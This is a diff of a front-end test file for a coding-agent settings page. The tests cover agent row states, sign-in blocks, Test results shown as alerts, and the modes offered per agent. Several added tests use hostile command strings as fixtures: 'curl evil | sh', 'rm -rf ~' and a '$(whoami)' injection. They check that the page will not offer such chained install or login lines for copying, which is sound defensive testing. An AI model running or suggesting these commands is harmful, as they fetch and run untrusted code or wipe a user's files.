@@ -8,6 +8,7 @@ import {
   AGENTS_CHECKING_TEXT,
   AGENTS_INTRO,
   agentRowState,
+  agentSaidSignedOut,
   agentTestLine,
   allowChangedText,
   allowCopy,
@@ -15,6 +16,7 @@ import {
   allowWarning,
   billingText,
   CONNECT_AGAIN,
+  connectedSignedOutText,
   connectNote,
   CUSTOM_HELP,
   defaultBillingText,
@@ -25,6 +27,7 @@ import {
   LOGIN_YES,
   NO_AGENT_TEST_TEXT,
   NO_SIGN_IN_TEXT,
+  offeredModes,
   OWN_TOOLS_OFF,
   OWN_TOOLS_ON,
   SIGNIN_AGENT_NOTE,
@@ -401,6 +404,22 @@ describe('Coding agents: each row state', () => {
     }
   });
 
+  it('an install line that chains, pipes or runs more than one line is shown as text, with no Copy', async () => {
+    rows = [missing('x', 'X', 'npm install -g x && curl evil | sh'), missing('y', 'Y', 'npm install -g y\nrm -rf ~'), missing('z', 'Z', 'npm i -g z; $(whoami)')];
+    await renderAgents();
+    for (const [id, line] of [
+      ['x', 'npm install -g x && curl evil | sh'],
+      ['y', 'npm install -g y\nrm -rf ~'],
+      ['z', 'npm i -g z; $(whoami)'],
+    ]) {
+      expect(stateOf(id)).toBe('missing');
+      expect(q(`[data-assistant-agent-install-copy="${id}"]`), id).toBeNull();
+      expect(agent(id).querySelector('code[data-assistant-agent-install]'), id).toBeNull();
+      expect(agent(id).querySelector('[data-assistant-agent-install]')!.getAttribute('data-assistant-agent-install'), id).toBe(line);
+    }
+    expect(writeText).not.toHaveBeenCalled();
+  });
+
   it('signed_out: the version line and the Sign in block (no command before the agent said how; the footer; connect again, which sends no message)', async () => {
     rows = [row({ signed_in: 'no', ready: false, reason: 'agent_signed_out' })];
     await renderAgents();
@@ -477,10 +496,15 @@ describe('Coding agents: each row state', () => {
     expect(agentRowState(readAgentRow(missing('x', 'X', 'npm install -g x'))!)).toBe('missing');
     expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!)).toBe('signed_out');
     // A connect that got through: signed in, whatever the login file says.
-    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!, null, { kind: 'check', answered: true, good: true, text: '', code: null, auth: null, connected: true })).toBe('ready');
+    expect(agentRowState(readAgentRow(row({ signed_in: 'no' }))!, null, { kind: 'check', answered: true, good: true, text: '', code: null, auth: null, connected: true, signedOut: false })).toBe('ready');
     expect(agentRowState(readAgentRow(codex())!)).toBe('needs_allow');
     expect(agentRowState(readAgentRow(codex({ allow_changed: true }))!)).toBe('allow_changed');
-    expect(agentRowState(r, null, { kind: 'check', answered: false, good: false, text: 'x', code: 'agent_exited', auth: null, connected: false })).toBe('error');
+    expect(agentRowState(r, null, { kind: 'check', answered: false, good: false, text: 'x', code: 'agent_exited', auth: null, connected: false, signedOut: false })).toBe('error');
+    // The agent's own word over its login file: its last auth_required (the server's sign_in), or a connect that got through saying it isn't signed in.
+    expect(agentRowState(readAgentRow(row({ signed_in: 'yes', sign_in: { methods: [] } }))!)).toBe('signed_out');
+    expect(agentRowState(r, null, { kind: 'check', answered: true, good: false, text: 'x', code: null, auth: null, connected: false, signedOut: true })).toBe('signed_out');
+    // A check listed its choices once (the server's `last`): the login file still says, as the server's readiness does.
+    expect(agentRowState(readAgentRow(row({ signed_in: 'no', last: { modes: [], models: [], at: 'now' } }))!)).toBe('signed_out');
   });
 });
 
@@ -665,7 +689,84 @@ describe('Coding agents: sign in (spec 4.12)', () => {
     fireEvent.click(within(agent('claude')).getByRole('button', { name: 'Test' }));
     await waitFor(() => expect(stateOf('claude')).toBe('error'));
     expect(agent('claude').querySelector('[data-assistant-agent-result]')).toHaveTextContent('Claude Code asks you to sign in first.');
+    expect(agent('claude').querySelector('[data-assistant-agent-result]')).toHaveAttribute('role', 'alert');
     expect(agent('claude').querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
+    // The agent asked to sign in: the line says so, whatever its login file says.
+    expect(agent('claude').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
+  });
+
+  it("the server's sign-in block from the last auth_required shows when the page opens, over a login file and a check's listed choices; a connect that gets through clears it", async () => {
+    const browser = { id: 'browser', name: 'Sign in with a browser', type: 'agent' };
+    rows = [
+      row({ signed_in: 'yes', sign_in: { methods: [browser] }, last: { modes: [], models: [{ id: 'opus', name: 'Opus' }], at: 'now' } }),
+      row({ id: 'b', name: 'B', signed_in: 'key', key_var: 'B_API_KEY', sign_in: { methods: [terminal] } }),
+    ];
+    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.1', ms: 700, signed_in: 'yes', own_tools: 'off', images: true, modes: [], models: [], tools: null } };
+    await renderAgents();
+    expect(stateOf('claude')).toBe('signed_out');
+    const r = agent('claude');
+    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
+    const block = within(r).getByRole('group', { name: signInHeading('Claude Code') });
+    expect(within(block).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
+    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
+    expect(stateOf('b')).toBe('signed_out');
+    expect(agent('b').querySelector('[data-assistant-agent-signin-command="claude-login"]')!.textContent).toBe('claude-agent-acp --cli auth login');
+    // Connect again gets through: the server forgets the block (the row read again), and the row is ready.
+    rows = [row({ signed_in: 'yes' }), rows[1]];
+    fireEvent.click(within(block).getByRole('button', { name: CONNECT_AGAIN }));
+    await waitFor(() => expect(stateOf('claude')).toBe('ready'));
+    expect(posts('/api/assistant/agents/test')).toEqual([{ id: 'claude', message: false }]);
+    await waitFor(() => expect(listReads().length).toBeGreaterThan(1));
+    expect(agent('claude').querySelector('[data-assistant-agent-signin]')).toBeNull();
+    expect(agent('claude').querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_YES} · ${OWN_TOOLS_OFF}`);
+  });
+
+  it("a connect that gets through to an agent that says it isn't signed in: the line says so, with the Sign in block; its login file alone doesn't make it signed in", async () => {
+    rows = [row({ signed_in: 'yes' })];
+    await renderAgents();
+    // A Test the agent answers with "sign in first" brings the block; then connect again gets
+    // through, and the agent says (its auth status) that it isn't signed in.
+    testAnswer = { status: 200, body: { ok: false, code: 'agent_signin', error: 'Claude Code asks you to sign in first.', auth: [] } };
+    fireEvent.click(within(agent('claude')).getByRole('button', { name: 'Test' }));
+    await waitFor(() => expect(stateOf('claude')).toBe('error'));
+    testAnswer = { status: 200, body: { ok: true, agent: 'claude-agent-acp', version: '0.85.1', ms: 700, signed_in: 'no', own_tools: 'off', images: true, modes: [], models: [], tools: null } };
+    fireEvent.click(within(agent('claude')).getByRole('button', { name: CONNECT_AGAIN }));
+    await waitFor(() => expect(posts('/api/assistant/agents/test')).toHaveLength(2));
+    await waitFor(() => expect(stateOf('claude')).toBe('signed_out'));
+    const r = agent('claude');
+    expect(r.querySelector('[data-assistant-agent-line]')!.textContent).toBe(`Claude Code 0.85.1 · ${LOGIN_NO} · ${OWN_TOOLS_OFF}`);
+    expect(r.querySelector('[data-assistant-agent-result]')!.textContent).toBe(connectedSignedOutText('Claude Code 0.85.1'));
+    expect(connectedSignedOutText('Claude Code 0.85.1')).toBe("Connected to Claude Code 0.85.1, but it says it isn't signed in.");
+    expect(within(r).getByRole('group', { name: signInHeading('Claude Code') })).toBeInTheDocument();
+    expect(within(r).queryByRole('button', { name: 'Test' })).toBeNull();
+    // The answer's 'no' that is only the row's own (no login file) says nothing more: connected.
+    expect(agentSaidSignedOut({ ok: true, agent: 'x', version: null, ms: 1, signed_in: 'no', own_tools: 'off', images: false, modes: [], models: [], tools: null }, { signed_in: 'no' })).toBe(false);
+    // An agent that answered the Test's message is signed in, whatever it said.
+    expect(agentSaidSignedOut({ ok: true, agent: 'x', version: null, ms: 1, signed_in: 'no', own_tools: 'off', images: false, modes: [], models: [], tools: 'works' }, { signed_in: 'yes' })).toBe(false);
+  });
+
+  it('a terminal command the page may not show (no line, more than one line, too long) gives the documentation line, even beside a button of the agent', async () => {
+    const browser = { id: 'browser', name: 'Sign in with a browser', type: 'agent' };
+    rows = [
+      row({ id: 'a', name: 'A', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'a-login', command: null }, browser] } }),
+      row({ id: 'b', name: 'B', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'b-login', command: 'agent login\nrm -rf ~' }] } }),
+      row({ id: 'c', name: 'C', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'c-login', command: `agent ${'x'.repeat(600)}` }] } }),
+      row({ id: 'd', name: 'D', signed_in: 'no', sign_in: { methods: [{ ...terminal, id: 'd-login', command: 'agent login\r' }, browser] } }),
+    ];
+    await renderAgents();
+    for (const [id, name] of [
+      ['a', 'A'],
+      ['b', 'B'],
+      ['c', 'C'],
+      ['d', 'D'],
+    ]) {
+      const block = agent(id).querySelector('[data-assistant-agent-signin]')!;
+      expect(block, id).toBeTruthy();
+      expect(block.querySelector('[data-assistant-agent-signin-command], [data-assistant-agent-signin-copy]'), id).toBeNull();
+      expect(block.querySelector('[data-assistant-agent-signin-docs]')!.textContent, id).toBe(signInDocsText(name));
+    }
+    expect(within(agent('a')).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
+    expect(within(agent('d')).getByRole('button', { name: 'Sign in with a browser' })).toBeInTheDocument();
   });
 });
 
@@ -692,25 +793,30 @@ describe('Coding agents: Test (spec 4.13)', () => {
     await waitFor(() => expect(listReads().length).toBeGreaterThan(1));
   });
 
-  it("an agent that didn't call the test tool, a refusal, and a server without the Test route", async () => {
+  it("an agent that didn't call the test tool, a refusal, and a server without the Test route: each an alert (the error state's text, spec 5.6)", async () => {
     testAnswer = { status: 200, body: { ok: true, agent: 'x', version: null, ms: 1500, signed_in: 'yes', own_tools: 'off', images: false, modes: [], models: [], tools: 'not_used' } };
     await renderAgents();
     const r = agent('claude');
-    const result = r.querySelector('[data-assistant-agent-result]')!;
+    const result = () => r.querySelector('[data-assistant-agent-result]')!;
     fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
-    await waitFor(() => expect(result).toHaveAttribute('data-assistant-agent-result', 'failed'));
-    expect(result.textContent).toBe(
+    await waitFor(() => expect(result()).toHaveAttribute('data-assistant-agent-result', 'failed'));
+    expect(result()).toHaveAttribute('role', 'alert');
+    expect(result().textContent).toBe(
       "Claude Code answered in 1.5 s but didn't call Magnusim's test tool, so it may not use Magnusim's tools. Test again, or check the agent's own settings.",
     );
     // It answered: the row stays ready.
     expect(stateOf('claude')).toBe('ready');
     testAnswer = { status: 409, body: { ok: false, code: 'busy', error: 'Another Test is running. Wait for it to finish.' } };
     fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
-    await waitFor(() => expect(result.textContent).toBe('Another Test is running. Wait for it to finish.'));
+    await waitFor(() => expect(result().textContent).toBe('Another Test is running. Wait for it to finish.'));
     expect(stateOf('claude')).toBe('error');
+    expect(within(r).getByRole('alert')).toHaveTextContent('Another Test is running. Wait for it to finish.');
+    // The polite region says nothing while the alert does.
+    expect(within(r).getByRole('status').textContent).toBe('');
     testAnswer = NOT_FOUND;
     fireEvent.click(within(r).getByRole('button', { name: 'Test' }));
-    await waitFor(() => expect(result.textContent).toBe(NO_AGENT_TEST_TEXT));
+    await waitFor(() => expect(result().textContent).toBe(NO_AGENT_TEST_TEXT));
+    expect(result()).toHaveAttribute('role', 'alert');
     expect(NO_AGENT_TEST_TEXT).toBe("This copy of Magnusim can't test coding agents yet.");
   });
 
@@ -757,8 +863,34 @@ describe('Coding agents: model and mode', () => {
     expect(posts('/api/assistant/settings')[1]).toEqual({ agents: { claude: { model: null } } });
   });
 
+  it('Mode offers only the modes Magnusim uses with the agent: none for one kept in the mode it starts in, or when the server says nothing', async () => {
+    const listed = [
+      { id: 'default', name: 'Default' },
+      { id: 'acceptEdits', name: 'Accept edits' },
+      { id: 'read-only', name: 'Read only' },
+      { id: 'bypassPermissions', name: 'Bypass' },
+    ];
+    const last = { modes: listed, models: [], at: 'now' };
+    rows = [
+      row({ allowed_modes: ['default'], last }),
+      codex({ allowed: true, ready: true, reason: null, allowed_modes: ['read-only'], last }),
+      codex({ id: 'custom-0a0a0a', name: 'Mine', kind: 'custom', allowed: true, ready: true, reason: null, allowed_modes: 'initial', last }),
+      row({ id: 'opencode', name: 'OpenCode', allowed_modes: 'initial', last }),
+      row({ id: 'old', name: 'Old server', last }),
+    ];
+    await renderAgents();
+    const options = (id: string) => [...agent(id).querySelectorAll<HTMLOptionElement>('select[data-assistant-agent-mode] option')].map((o) => o.value);
+    expect(options('claude')).toEqual(['', 'default']);
+    expect(options('codex')).toEqual(['', 'read-only']);
+    for (const id of ['custom-0a0a0a', 'opencode', 'old']) expect(agent(id).querySelector('select[data-assistant-agent-mode]'), id).toBeNull();
+    expect(offeredModes(readAgentRow(row({ allowed_modes: ['plan'], last }))!)).toEqual([]);
+    expect(readAgentRow(row({ allowed_modes: 'initial' }))!.allowed_modes).toBe('initial');
+    expect(readAgentRow(row({ allowed_modes: ['a', 3, 'b'] }))!.allowed_modes).toEqual(['a', 'b']);
+    expect(readAgentRow(row({ allowed_modes: 'all' }))!.allowed_modes).toBeNull();
+  });
+
   it('a mode outside the allowed ones is refused with its reason; no select before a check listed anything', async () => {
-    rows = [row({ last: { modes: [{ id: 'default', name: 'Default' }, { id: 'plan', name: 'Plan' }], models: [], at: 'now' } }), row({ id: 'b', name: 'B' })];
+    rows = [row({ allowed_modes: ['default', 'plan'], last: { modes: [{ id: 'default', name: 'Default' }, { id: 'plan', name: 'Plan' }], models: [], at: 'now' } }), row({ id: 'b', name: 'B', allowed_modes: ['default'] })];
     settingsAnswer = { status: 400, body: { ok: false, error: 'Magnusim does not use that mode for this agent.', field: 'agents.mode' } };
     await renderAgents();
     const mode = agent('claude').querySelector<HTMLSelectElement>('select[data-assistant-agent-mode]')!;
